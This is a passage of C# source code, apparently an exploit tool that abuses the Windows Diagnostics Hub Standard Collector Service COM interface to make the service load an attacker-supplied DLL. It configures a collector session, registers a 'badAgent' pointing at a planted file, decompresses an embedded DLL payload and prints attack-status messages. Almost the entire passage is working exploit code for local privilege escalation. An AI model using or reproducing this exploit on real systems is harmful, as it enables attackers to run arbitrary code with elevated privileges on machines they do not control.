                CollectorScratch = scratch,
                Location = CollectionLocation.Local,
                Flags = SessionConfigurationFlags.None,
                LifetimeMonitorProcessId = (uint)procId,
                SessionId = sessionId,
                Type = CollectionType.Etw
            };

            var procIds = new List<uint> { (uint)procId };

            var badAgent = new Dictionary<Guid, string>
            {
                {DefaultAgent.Clsid, DefaultAgent.AssemblyName},
                {sessionId, filename}
            };

            Console.WriteLine(" [>] Getting new collector service");
            _service = GetCollectorService();
            
            SetProxyBlanketForService(_service);
            Console.WriteLine(" [>] Starting session with DLL payload");
            Start(sessionConfiguration, badAgent, procIds);
            Console.WriteLine($@" [!] All Done. Remember to restore {scratch}\{filename}");

            // give it some time. if you exit too early, it won't run.
            Thread.Sleep(4000);
        }

        public static byte[] DecompressDLL(byte[] gzip)
        {
            using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
            {
                const int size = 4096;
                byte[] buffer = new byte[size];
                using (MemoryStream memory = new MemoryStream())
                {
                    int count = 0;
                    do
                    {
                        count = stream.Read(buffer, 0, size);
                        if (count > 0)
                        {
                            memory.Write(buffer, 0, count);
                        }
                    }
                    while (count > 0);
                    return memory.ToArray();
                }
            }
        }

        public static void Start(SessionConfiguration sessionConfiguration, Dictionary<Guid, string> agents, List<uint> processIds)
        {
            var collectionSession = _service.CreateSession(ref sessionConfiguration);

            foreach (var agent in agents)
            {
                try
                {
                    var name = agent.Value;
                    var clsid = agent.Key;
                    collectionSession.AddAgent(name, ref clsid);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(agent.Key == sessionConfiguration.SessionId
                        ? " [>] DLL should have loaded"
                        : $" [x] Error adding agent {agent.Key}: {ex.Message}");
                }
            }

            collectionSession.Start();
            Console.WriteLine(" [>] Collector session started");

            SetProxyBlanketForSession(collectionSession);
            foreach (var processId in processIds)
                collectionSession.PostStringToListener(DefaultAgent.Clsid, DefaultAgent.AddTargetProcess(processId));
        }

        private static IStandardCollectorService GetCollectorService()
        {
            LoadProxyStubsForCollectorService();
            object obj = null;
            try
            {
                NativeMethods.CoCreateInstance(typeof(StandardCollectorServiceClass).GUID, null, 4u, typeof(IStandardCollectorService).GUID, out obj);
            }
            catch (COMException ex)
            {
                Console.WriteLine($"Error getting collector service: {ex.Message}");
            }
            return obj as IStandardCollectorService;
        }

        private static void LoadProxyStubsForCollectorService()
        {
            var intPtr = NativeMethods.LoadLibraryEx(Environment.Is64BitProcess
                    ? @"C:\Windows\System32\DiagSvcs\DiagnosticsHub.StandardCollector.Proxy.dll"
                    : @"C:\Windows\SysWOW64\DiagSvcs\DiagnosticsHub.StandardCollector.Proxy.dll",
                IntPtr.Zero, 0);

            if (intPtr == IntPtr.Zero)
                throw new Exception("Invalid proxy dll pointer");

            var procAddress = NativeMethods.GetProcAddress(intPtr, "ManualRegisterInterfaces");
            if (procAddress == IntPtr.Zero)
                throw new Exception("Invalid ManualRegisterInterfaces pointer");

            var manualRegisterInterfacesDelegate = (ManualRegisterInterfacesDelegate)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(ManualRegisterInterfacesDelegate));
            Marshal.ThrowExceptionForHR(manualRegisterInterfacesDelegate());
        }

        private static void SetProxyBlanketForService(IStandardCollectorService service)
        {
            var guid = typeof(IStandardCollectorService).GUID;
            var iunknownForObject = Marshal.GetIUnknownForObject(service);
            var errorCode = Marshal.QueryInterface(iunknownForObject, ref guid, out var intPtr);

            Marshal.ThrowExceptionForHR(errorCode);
            try
            {
                errorCode = NativeMethods.CoSetProxyBlanket(intPtr, uint.MaxValue, uint.MaxValue, IntPtr.Zero, 0u, 3u, IntPtr.Zero, 2048u);
                Marshal.ThrowExceptionForHR(errorCode);
            }
            finally
            {
                if (intPtr != IntPtr.Zero)
                    Marshal.Release(intPtr);
            }
        }

        private static void SetProxyBlanketForSession(ICollectionSession session)
        {
            var guid = typeof(ICollectionSession).GUID;
            var iunknownForObject = Marshal.GetIUnknownForObject(session);
            var errorCode = Marshal.QueryInterface(iunknownForObject, ref guid, out var intPtr);
            Marshal.ThrowExceptionForHR(errorCode);

            try
            {
                errorCode = NativeMethods.CoSetProxyBlanket(intPtr, uint.MaxValue, uint.MaxValue, IntPtr.Zero, 0u, 3u, IntPtr.Zero, 2048u);
                Marshal.ThrowExceptionForHR(errorCode);
            }
            finally
            {
                if (intPtr != IntPtr.Zero)
                    Marshal.Release(intPtr);
            }
        }
    }

    public static class NativeMethods
    {
        [DllImport("ole32.dll", ExactSpelling = true, PreserveSig = false)]
        internal static extern int CoSetProxyBlanket(
            IntPtr pProxy,
            uint dwAuthnSvc,
            uint dwAuthzSvc,
            IntPtr pServerPrincName,
            uint dwAuthnLevel,
            uint dwImpLevel,
            IntPtr pAuthInfo,
            uint dwCapabilities
        );

        [DllImport("ole32.dll", ExactSpelling = true, PreserveSig = false)]
        [return: MarshalAs(UnmanagedType.Interface)]
        internal static extern void CoCreateInstance(
            [MarshalAs(UnmanagedType.LPStruct)] [In] Guid rclsid,
            [MarshalAs(UnmanagedType.IUnknown)] object aggregateObject,
            uint classContext,
            [MarshalAs(UnmanagedType.LPStruct)] [In] Guid riid,
            [MarshalAs(UnmanagedType.IUnknown)] out object returnedComObject
        );

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        internal static extern IntPtr LoadLibraryEx(
            string lpFileName,
            IntPtr hReservedNull,
            int dwFlags
        );

        [DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Ansi, ThrowOnUnmappableChar = true)]
        internal static extern IntPtr GetProcAddress(
            IntPtr hModule,
            [MarshalAs(UnmanagedType.LPStr)] string procname
        );
    }

    public enum CollectionType
    {
        Unknown,
        Etw
    }

    public enum CollectionLocation
    {
        Local,
        Remote,
        Headless
    }

    public enum SessionConfigurationFlags
    {
        None,
        DisposeOfRawData,
        DebuggerCollection,
        NoSessionPackage = 4
    }

    public enum SessionEvent
    {
        BeforeSessionStart = 1,
        AfterSessionStart,
        BeforeProcessLaunch,
        AfterProcessLaunch,
        StartProfilingProcess,
        StopProfilingProcess,
        EnterDebuggerBreakState,
        ExitDebuggerBreakState,
        BeforeSessionStop,
        AfterSessionStop
    }

    public enum SessionState
    {
        Unknown,
        Created,
        Running,
        Paused,
        Stopped,
        Errored
    }

    [ComConversionLoss]
    [StructLayout(LayoutKind.Sequential, Pack = 4)]
    public struct GraphDataUpdates
    {
        public uint Length;

        [ComConversionLoss]
        public IntPtr Updates;
    }

    [ComConversionLoss]
    [StructLayout(LayoutKind.Sequential, Pack = 4)]
    public struct CollectorByteMessage
    {
        public uint Length;

        [ComConversionLoss]
        public IntPtr Message;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 4)]
    public struct SessionConfiguration
    {
        public CollectionType Type;
        public CollectionLocation Location;
        public SessionConfigurationFlags Flags;
        public uint LifetimeMonitorProcessId;
        public Guid SessionId;

        [MarshalAs(UnmanagedType.BStr)]
        public string CollectorScratch;
        public ushort ClientLocale;
    }

    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [Guid("929a9813-d378-4ac5-871c-c280a5b7bf28")]
    [ComImport]
    public interface IStandardCollectorMessagePort
    {
        [MethodImpl(MethodImplOptions.InternalCall)]
        void PostStringToListener(
            [In] Guid listenerId,
            [MarshalAs(UnmanagedType.LPWStr)] [In] string payload
        );

        [MethodImpl(MethodImplOptions.InternalCall)]
        void PostBytesToListener(
            [In] Guid listenerId,
            [In] ref CollectorByteMessage payload
        );
    }

    [Guid("60a2c2a0-bb00-48b6-b6ac-7be5f3211af5")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [ComImport]
    public interface ICollectionSession : IStandardCollectorMessagePort
    {
        [MethodImpl(MethodImplOptions.InternalCall)]
        new void PostStringToListener(
            [In] Guid listenerId, 
            [MarshalAs(UnmanagedType.LPWStr)] [In] string payload
        );

        [MethodImpl(MethodImplOptions.InternalCall)]
        new void PostBytesToListener(
            [In] Guid listenerId, 
            [In] ref CollectorByteMessage payload
        );

        [MethodImpl(MethodImplOptions.InternalCall)]
        void AddAgent(
            [MarshalAs(UnmanagedType.LPWStr)] [In] string agentName, 
            [In] ref Guid clsid
        );

        [MethodImpl(MethodImplOptions.InternalCall)]
        [return: MarshalAs(UnmanagedType.Struct)]
        object Start();

        [MethodImpl(MethodImplOptions.InternalCall)]
        [return: MarshalAs(UnmanagedType.Struct)]
        object GetCurrentResult([In] bool pauseCollection);

        [MethodImpl(MethodImplOptions.InternalCall)]
        void Pause();

        [MethodImpl(MethodImplOptions.InternalCall)]
        void Resume();

        [MethodImpl(MethodImplOptions.InternalCall)]
        [return: MarshalAs(UnmanagedType.Struct)]
        object Stop();

        [MethodImpl(MethodImplOptions.InternalCall)]
        void TriggerEvent(
            [In] SessionEvent eventType, 
            [MarshalAs(UnmanagedType.Struct)] [In] ref object eventArg1, 
            [MarshalAs(UnmanagedType.Struct)] [In] ref object eventArg2, 
            [MarshalAs(UnmanagedType.Struct)] out object eventOut
        );

        [MethodImpl(MethodImplOptions.InternalCall)]
        GraphDataUpdates GetGraphDataUpdates(
            [In] ref Guid agentId, 
            [MarshalAs(UnmanagedType.SafeArray, SafeArraySubType = VarEnum.VT_BSTR)] [In] string[] counterIdAsBstrs
        );

        [MethodImpl(MethodImplOptions.InternalCall)]
        SessionState QueryState();

        [MethodImpl(MethodImplOptions.InternalCall)]
        [return: MarshalAs(UnmanagedType.BStr)]
        string GetStatusChangeEventName();

        [MethodImpl(MethodImplOptions.InternalCall)]
        [return: MarshalAs(UnmanagedType.Error)]
        int GetLastError();

        [MethodImpl(MethodImplOptions.InternalCall)]
        [return: MarshalAs(UnmanagedType.Struct)]
        object SetClientDelegate(
            [MarshalAs(UnmanagedType.Interface)] [In] IStandardCollectorClientDelegate clientDelegate = null
        );

        [MethodImpl(MethodImplOptions.InternalCall)]
        void AddAgentWithConfiguration(
            [MarshalAs(UnmanagedType.LPWStr)] [In] string agentName, 
            [In] ref Guid clsid, 
            [MarshalAs(UnmanagedType.LPWStr)] [In] string agentConfiguration
        );
    }

    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [Guid("4323664b-b884-4929-8377-d2fd097f7bd3")]
    [ComImport]
    public interface IStandardCollectorClientDelegate
    {
        [MethodImpl(MethodImplOptions.InternalCall)]
        void OnReceiveString(
            [In] ref Guid listenerId,
            [MarshalAs(UnmanagedType.LPWStr)] [In] string payload
        );

        [MethodImpl(MethodImplOptions.InternalCall)]
        void OnReceiveBytes(
            [In] ref Guid listenerId,
            [In] ref CollectorByteMessage payload
        );

        [MethodImpl(MethodImplOptions.InternalCall)]
        void OnReceiveFile(
            [In] ref Guid listenerId,
            [MarshalAs(UnmanagedType.LPWStr)] [In] string localFilePath,
            [In] bool deleteAfterPost
        );
    }

    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [Guid("2d2ac45d-03bb-4b8a-8efe-93ef98217054")]
    [ComImport]
    public interface IStandardCollectorAuthorizationService
    {
        [MethodImpl(MethodImplOptions.InternalCall)]
        void AuthorizeSession([In] ref Guid sessionId);
    }

    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [Guid("0D8AF6B7-EFD5-4F6D-A834-314740AB8CAA")]
    [ComImport]
    public interface IStandardCollectorService
    {
        [MethodImpl(MethodImplOptions.InternalCall)]
        [return: MarshalAs(UnmanagedType.Interface)]
        ICollectionSession CreateSession(
            [In] ref SessionConfiguration sessionConfig,
            [MarshalAs(UnmanagedType.Interface)] [In] IStandardCollectorClientDelegate clientDelegate = null
        );

        [MethodImpl(MethodImplOptions.InternalCall)]
        [return: MarshalAs(UnmanagedType.Interface)]
        ICollectionSession GetSession([In] ref Guid sessionId);

        [MethodImpl(MethodImplOptions.InternalCall)]
        void DestroySession([In] ref Guid sessionId);

        [MethodImpl(MethodImplOptions.InternalCall)]
        void DestroySessionAsync([In] ref Guid sessionId);

        [MethodImpl(MethodImplOptions.InternalCall)]
        void AddLifetimeMonitorProcessIdForSession(
            [In] ref Guid sessionId, [In] uint lifetimeMonitorProcessId
        );
    }

    [CoClass(typeof(StandardCollectorServiceClass))]
    [Guid("0D8AF6B7-EFD5-4F6D-A834-314740AB8CAA")]
    [ComImport]
    public interface StandardCollectorService : IStandardCollectorService
    {
    }

    [TypeLibType(TypeLibTypeFlags.FCanCreate)]
    [ClassInterface(ClassInterfaceType.None)]
    [Guid("42CBFAA7-A4A7-47BB-B422-BD10E9D02700")]
    [ComImport]
    public class StandardCollectorServiceClass : StandardCollectorService, IStandardCollectorAuthorizationService
    {
        [MethodImpl(MethodImplOptions.InternalCall)]
        [return: MarshalAs(UnmanagedType.Interface)]
        public virtual extern ICollectionSession CreateSession(
            [In] ref SessionConfiguration sessionConfig, 
            [MarshalAs(UnmanagedType.Interface)] [In] IStandardCollectorClientDelegate clientDelegate = null
        );

        [MethodImpl(MethodImplOptions.InternalCall)]
        [return: MarshalAs(UnmanagedType.Interface)]
        public virtual extern ICollectionSession GetSession([In] ref Guid sessionId);

        [MethodImpl(MethodImplOptions.InternalCall)]
        public virtual extern void DestroySession([In] ref Guid sessionId);

        [MethodImpl(MethodImplOptions.InternalCall)]
        public virtual extern void DestroySessionAsync([In] ref Guid sessionId);

        [MethodImpl(MethodImplOptions.InternalCall)]
        public virtual extern void AddLifetimeMonitorProcessIdForSession(
            [In] ref Guid sessionId, 
            [In] uint lifetimeMonitorProcessId
        );

        [MethodImpl(MethodImplOptions.InternalCall)]
        public virtual extern void AuthorizeSession([In] ref Guid sessionId);
    }
    
    public class DefaultAgent
    {
        public static readonly Guid Clsid = new Guid("E485D7A9-C21B-4903-892E-303C10906F6E");
        public static readonly string AssemblyName = "DiagnosticsHub.StandardCollector.Runtime.dll";

        public static string AddTargetProcess(uint processId) => 
            $"{{ \"command\":\"addTargetProcess\", \"processId\":{processId}, \"startReason\":0, \"requestRundown\":true }}";

        public static string RemoveTargetProcess(uint processId) => 
            $"{{ \"command\":\"removeTargetProcess\", \"processId\":{processId} }}";
    }
}